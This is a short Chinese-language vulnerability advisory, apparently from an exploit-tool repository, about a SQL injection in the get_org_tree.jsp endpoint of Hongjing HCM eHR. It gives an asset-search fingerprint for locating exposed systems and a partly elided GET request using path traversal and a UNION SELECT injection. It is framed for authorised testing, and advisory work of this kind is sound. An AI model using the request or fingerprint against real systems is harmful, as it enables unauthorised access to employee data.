---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM get_org_tree.jsp SQL注入漏洞

## 漏洞描述

宏景HCM `/templates/attestation/../../kq/app_check_in/get_org_tree.jsp` 接口存在 SQL 注入漏洞，UNION 联合查询回显。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /templates/attestation/../../kq/app_check_in/get_org_tree.jsp?...1=0 union select 1,... HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
